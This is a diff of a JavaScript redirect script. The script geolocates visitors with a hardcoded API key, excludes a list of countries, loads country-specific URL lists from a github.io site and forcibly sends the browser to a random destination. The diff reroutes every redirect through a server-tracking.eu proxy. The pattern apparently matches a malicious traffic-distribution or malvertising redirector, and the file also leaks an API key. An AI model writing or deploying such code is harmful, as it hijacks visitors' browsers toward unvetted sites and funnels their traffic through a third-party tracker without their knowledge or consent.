@@ -31,7 +31,6 @@ const jsonUrls = [
     'https://api.ipgeolocation.io/ipgeo?apiKey=d5b00b6c0ec2490592216aa7cc012d2c'
 ];
 
-
 // Configuration for country-based URL redirection
 const countryConfig = {
     GB: 'https://hellonetwork2023.github.io/uk/ukurls.json',
@@ -53,7 +52,7 @@ const excludedCountries = ['MA', 'FR', 'ES', 'DZ', 'CN', 'EG', 'TR', 'IN', 'IR',
 
             if (!countryCode) {
                 console.warn('Country code not found, redirecting to default.');
-                redirectToUrls(countryConfig.default);
+                redirectToProxy(countryConfig.default);
                 return;
             }
 
@@ -67,16 +66,16 @@ const excludedCountries = ['MA', 'FR', 'ES', 'DZ', 'CN', 'EG', 'TR', 'IN', 'IR',
 
             // Fetch and redirect based on country
             const jsonFile = countryConfig[countryCode] || countryConfig.default;
-            redirectToUrls(jsonFile);
+            redirectToProxy(jsonFile);
         })
         .catch(error => {
             console.error('Error fetching country information:', error);
-            redirectToUrls(countryConfig.default);
+            redirectToProxy(countryConfig.default);
         });
 })();
 
-// Fetch URLs from JSON and perform redirection
-function redirectToUrls(jsonFile, delay = 300) {
+// Redirect through server-tracking.eu
+function redirectToProxy(jsonFile, delay = 300) {
     fetch(jsonFile)
         .then(response => response.json())
         .then(data => {
@@ -89,9 +88,12 @@ function redirectToUrls(jsonFile, delay = 300) {
             const randomIndex = Math.floor(Math.random() * urls.length);
             const randomUrl = urls[randomIndex];
 
-            console.log(`Redirecting to: ${randomUrl}`);
+            // Redirect via server-tracking.eu
+            const proxyUrl = `https://server-tracking.eu/redirect?target=${encodeURIComponent(randomUrl)}`;
+
+            console.log(`Redirecting via proxy: ${proxyUrl}`);
             setTimeout(() => {
-                window.location.href = randomUrl;
+                window.location.href = proxyUrl;
             }, delay);
         })
         .catch(error => {
